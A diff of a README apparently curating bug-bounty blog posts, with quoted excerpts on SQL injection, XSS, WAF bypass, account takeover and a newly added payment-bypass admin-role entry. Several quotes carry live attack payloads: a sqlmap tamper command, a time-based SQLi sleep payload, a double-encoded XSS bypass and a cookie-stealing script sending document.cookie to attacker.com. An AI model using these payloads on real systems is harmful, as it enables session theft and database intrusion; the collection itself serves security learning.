@@ -4,39 +4,39 @@ This repository serves as a collection of insightful and informative blog posts 
 
 - **[SQLi Time-Based Blind Finding Methods @erkankavas](https://medium.com/@erkankavas/sqli-time-based-blind-finding-methods-cdef02de2d0e)**
 
-  As a bug hunter, it is essential to remain ethical and handle such situations professionally. Some individuals react impulsively and retaliate inappropriately in such cases. However, it’s crucial to    maintain self-control.
+As a bug hunter, it is essential to remain ethical and handle such situations professionally. Some individuals react impulsively and retaliate inappropriately in such cases. However, it’s crucial to    maintain self-control.
 
-  ``sqlmap -u "targetlink" -p parameter --tamper=space2comment --dbs --random-agent``
+``sqlmap -u "targetlink" -p parameter --tamper=space2comment --dbs --random-agent``
 
 - **[Bypassing WAFs: A Unique XSS Exploit Journey and Insights @erkankavas](https://medium.com/@erkankavas/bypassing-wafs-a-unique-xss-exploit-journey-and-insights-520d7060c281)**
   
-  Using two-level encoding like this allowed us to bypass the WAF and conceal the payload.
+Using two-level encoding like this allowed us to bypass the WAF and conceal the payload.
 
-  To make such payloads more convincing, you can prepend random characters or specific terms, elevating the attack to another level.
+To make such payloads more convincing, you can prepend random characters or specific terms, elevating the attack to another level.
 
-  ``%253c---key---%253e---key2—-%2528---emoji---%2529%253c%252f---key---%253e``
+``%253c---key---%253e---key2—-%2528---emoji---%2529%253c%252f---key---%253e``
 
 - **[Discovering SQLi Vulnerabilities Through Deeper Analysis @erkankavas](https://medium.com/@erkankavas/discovering-sqli-vulnerabilities-through-deeper-analysis-4e305dfbc181)**
 
-  As I’ve mentioned before, the reconnaissance phase is incredibly important, and you should continue your reconnaissance efforts even after finding an initial vulnerability.
+As I’ve mentioned before, the reconnaissance phase is incredibly important, and you should continue your reconnaissance efforts even after finding an initial vulnerability.
 
-  Every small mistake might lead you to something much bigger, so patience and keeping your eyes open are key.
+Every small mistake might lead you to something much bigger, so patience and keeping your eyes open are key.
 
-  ``+(select*from(select(sleep(20)))a)+`` 
+``+(select*from(select(sleep(20)))a)+`` 
 
 - **[Hidden Dangers of XSS Vulnerabilities — Real Case @erkankavas](https://medium.com/meetcyber/hidden-dangers-of-xss-vulnerabilities-real-case-22177daa6fc8)**
 
-  With this XSS payload, you can change the location in a reflected XSS vulnerability and redirect the page.
+With this XSS payload, you can change the location in a reflected XSS vulnerability and redirect the page.
 
-  Another favorite of mine is a payload that allows you to steal cookies:
+Another favorite of mine is a payload that allows you to steal cookies:
 
-  ``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``
+``<script>new Image().src="https://attacker.com/cookie.php?cookie="+document.cookie</script>``
 
 - **[Humorous XSS Vulnerabilities in a Movie Website @erkankavas](https://medium.com/meetcyber/humorous-xss-vulnerabilities-in-a-movie-website-3600d7828661)**
 
-  The system’s logic involves creating a new list from the “Create New List” section in the user profile, naming it, and then adding movies and TV series to curate a personalized list.
+The system’s logic involves creating a new list from the “Create New List” section in the user profile, naming it, and then adding movies and TV series to curate a personalized list.
 
-  This list is then published on your profile. However, due to a critical oversight by the developers, it’s possible to upload XSS payloads into the list’s title field using a simple trick.
+This list is then published on your profile. However, due to a critical oversight by the developers, it’s possible to upload XSS payloads into the list’s title field using a simple trick.
 
   ```
     <script>
@@ -49,47 +49,47 @@ This repository serves as a collection of insightful and informative blog posts 
 
 - **[A New Bug Hunting Story: Open Redirection Vulnerability @erkankavas](https://medium.com/meetcyber/a-new-bug-hunting-story-open-redirection-vulnerability-33a1b6374f88)**
 
-  Open redirection bugs generally occur in areas designed to redirect users automatically after completing a form or triggering an action, such as through parameters like refURL, returnURL, followURL. These vulnerabilities can be exploited to      manipulate users into being redirected to a malicious site after completing legitimate actions on the real website.
+Open redirection bugs generally occur in areas designed to redirect users automatically after completing a form or triggering an action, such as through parameters like refURL, returnURL, followURL. These vulnerabilities can be exploited to      manipulate users into being redirected to a malicious site after completing legitimate actions on the real website.
 
 - **[Account Takeover in Mobile Apps: How to Exploit Vulnerabilities @erkankavas](https://medium.com/meetcyber/account-takeover-in-mobile-apps-how-to-exploit-vulnerabilities-dc1b55ef6891)**
 
-  In the login section, when a user logs in, if the API returns a status : success and redirects you to the member-viewing frame, it is important to check for any vulnerabilities.
+In the login section, when a user logs in, if the API returns a status : success and redirects you to the member-viewing frame, it is important to check for any vulnerabilities.
 
-  Similarly, when registration is successful, the app either redirects to the main frame or shows an error message. At this point, create a temporary email, register, and analyze the requests using Burp Suite.
+Similarly, when registration is successful, the app either redirects to the main frame or shows an error message. At this point, create a temporary email, register, and analyze the requests using Burp Suite.
 
 - **[How i find sensitive files in 2 minutes @securityinsights](https://medium.com/@securityinsights/how-i-find-sensitive-files-in-2-minutes-easy-bug-2-d53965b7e4f4)**
 
-  While browsing a website, we only see the content intended for users. But wait — there’s more! Hidden files on websites may contain sensitive information like usernames, passwords, API keys, personal data, organizational secrets, cookies, or     tokens.
+While browsing a website, we only see the content intended for users. But wait — there’s more! Hidden files on websites may contain sensitive information like usernames, passwords, API keys, personal data, organizational secrets, cookies, or     tokens.
 
-  Some files might even be left on the server by mistake. If these fall into a hacker’s hands, they could lead to a serious data breach.
+Some files might even be left on the server by mistake. If these fall into a hacker’s hands, they could lead to a serious data breach.
 
 - **[Zero-Click Account Takeover @osamamohamed21212121](https://medium.com/@osamamohamed21212121/zero-click-account-takeover-critical-bug-ab31f27b8674)**
 
-  Account takeover vulnerabilities are among the most critical security flaws as they allow attackers to gain full control over user accounts. There are two main types of account takeover vulnerabilities:
+Account takeover vulnerabilities are among the most critical security flaws as they allow attackers to gain full control over user accounts. There are two main types of account takeover vulnerabilities:
 
   - Zero-Click Account Takeover: This type does not require any interaction from the victim.
   - One-Click Account Takeover: This type requires minimal interaction, such as clicking a link.
 
 - **[Bypassing Rate Limit Protection to Account Takeover @sohailahmed0x0](https://medium.com/@sohailahmed0x0/bypassing-rate-limit-protection-to-account-takeover-fe44598fc1df)**
-  
   Rate limit vulnerabilities are security weaknesses that occur when a system or service doesn’t properly enforce limits on how many requests a user or system can make in a given time period. Essentially, these vulnerabilities arise when the       system allows excessive requests from the same source or allows the rate of requests to exceed what is typical or safe.
 
 - **[How I Found a Bug in Sony and Earned Exclusive Swag! @josekuttykunnelthazhebinu](https://medium.com/@josekuttykunnelthazhebinu/how-i-found-a-bug-in-sony-and-earned-exclusive-swag-f565d56c395e)**
 
-  After some analysis, I came across an interesting parameter named error. This caught my attention, and I knew it was worth digging deeper.
+After some analysis, I came across an interesting parameter named error. This caught my attention, and I knew it was worth digging deeper.
 
-  The url was like this:
+The url was like this:
 
-  ```
-  https://target.com/my/login/errormessage?error=
-  ```
+```
+https://target.com/my/login/errormessage?error=
+```
   
   I tried the text injection and when I added the injection text it was not reflecting the way I expected, then I encoded the text and when submitted it was reflecting in the page in the format as expected.
 
 - **[Easiest $225 Ever: A Simple SQL Injection Win! @whoadnan01](https://medium.com/@whoadnan01/easiest-225-ever-a-simple-sql-injection-win-f40c0a6b8e45)**
 
-  This left me with around 50–60 live subdomains. From there, I randomly picked about 20–30 subdomains and opened them all at once using a Chrome extension called “Open Multiple URLs.”
-  While going through the subdomains, a few immediately stood out. One of them had a “page=” parameter in the URL, which instantly caught my attention.
+This left me with around 50–60 live subdomains. From there, I randomly picked about 20–30 subdomains and opened them all at once using a Chrome extension called “Open Multiple URLs.”
+
+While going through the subdomains, a few immediately stood out. One of them had a “page=” parameter in the URL, which instantly caught my attention.
   
   ```
   subfinder -d example.com -o example.txt
@@ -99,9 +99,16 @@ This repository serves as a collection of insightful and informative blog posts 
 
 - **[From Newbie to Pro: My Journey to a $3,000 Bug Bounty @myselfakash20](https://medium.com/bugbountywriteup/from-newbie-to-pro-my-journey-to-a-3-000-bug-bounty-61abe935e3db)**
   
-  It took weeks of persistence before I found my first vulnerability. It was an IDOR (Insecure Direct Object Reference) in a small web app. By manipulating a single parameter in the URL, I could access invoices from other users.
+It took weeks of persistence before I found my first vulnerability. It was an IDOR (Insecure Direct Object Reference) in a small web app. By manipulating a single parameter in the URL, I could access invoices from other users.
 
-  It was like magic — one parameter changed, and the doors swung open!
+It was like magic — one parameter changed, and the doors swung open!
+
+- **[Bypassing Payment Billing to Assign Admin Role @HBlackGhost](https://medium.com/@HBlackGhost/bypassing-payment-billing-to-assign-admin-role-via-business-logic-bug-f925d4266bb3)**
+
+After understanding the logic of the website, I found that it sends a request to assign any role to the backend without validating whether the role requires payment or not. The check is only enforced on the frontend side.
+
+The bug here is that if I send a role change request directly to the backend, I can upgrade a member’s privileges without making any payment
+
   
 - Discovering a Critical Vulnerability in Deepseek’s Password Reset Functionality leads to Zero Click Account Takeover
 
